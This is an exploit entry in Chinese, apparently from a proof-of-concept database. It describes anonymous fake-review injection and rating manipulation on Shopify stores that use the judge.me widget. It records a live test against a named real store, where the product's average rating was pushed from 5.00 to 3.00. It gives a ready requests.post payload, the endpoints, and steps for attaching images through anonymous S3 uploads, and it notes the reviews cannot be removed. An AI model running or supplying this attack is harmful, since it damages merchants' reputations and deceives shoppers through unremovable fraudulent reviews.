# judge.me 店面评论匿名注入与评分操纵（含匿名 S3 图片上传）实测打法

- **code**: judge.me-店面评论匿名注入与评分操纵-含匿名-s3-图片上传-实测打法
- **kind**: poc
- **category**: unauthorized
- **component**: judge.me
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 在 retro-refresh.com 实测：无 Cookie/Authorization 连发 5 条 POST https://api.judge.me/api/v1/reviews 全部 201 且约 1 分钟公开；商品 15756153225548 均分 5.00→3.00、商品 16247729586508 评论数 0→3；匿名 GET /api/v1/pictures/presigned_data 取得 public-read S3 预签名并上传 PNG，评论 pictures_urls 上线 review-images.judgeme.com；PUT 401/DELETE 404/update_review 403 证明第三方不可撤回。
- **tags**: judge.me,shopify,review,rating-manipulation,anonymous-write,file-upload
- **created_at**: 2026-11-11T18:48:06.875Z
- **engine**: https://api.judge.me（shop_domain=u1s10u-cw.myshopify.com / retro-refresh.com）

## 描述

Shopify 店铺集成的 judge.me 评论提交端点匿名可用（autopublish=true）：无需账号/Cookie/CSRF token/验证码/真实邮箱，multipart 提交后约 30 秒-数分钟公开并计入评分；同一 API 的 pictures/presigned_data 匿名下发 public-read S3 预签名，可把任意图片挂进评论。适用判据：页面加载 judge.me widget 且 jdgmSettings.autopublish=true；从 /products.json 取商品 id 可直接打任意商品。注意：正文 HTML 会被剥离/转义（无 stored XSS），rfw 对象不含 email（无 PII 读取）；注入内容第三方不可自删。

## 用法

```
1) 取 shop_domain（页面 jdgmSettings 内的 myshopify 域）；2) 商品 id 从 https://<store>/products.json?limit=250 取；3) 提交：requests.post('https://api.judge.me/api/v1/reviews', files=[('url',(None,shop)),('shop_domain',(None,shop)),('platform',(None,'shopify')),('id',(None,pid)),('rating',(None,'1')),('name',(None,n)),('email',(None,mail)),('body',(None,b))])；4) 约 1 分钟后 GET https://cdn.judge.me/reviews/reviews_for_widget?product_id=<pid>&shop_domain=<shop>&platform=shopify 验证 number_of_reviews/average_rating 变化与 body_html；5) 图片：GET /api/v1/pictures/presigned_data?url=<shop>&shop_domain=<shop>&platform=shopify → POST 返回的 url（fields+key+file）→ 评论 multipart 加 picture_keys[0]=<S3 Key>。
```
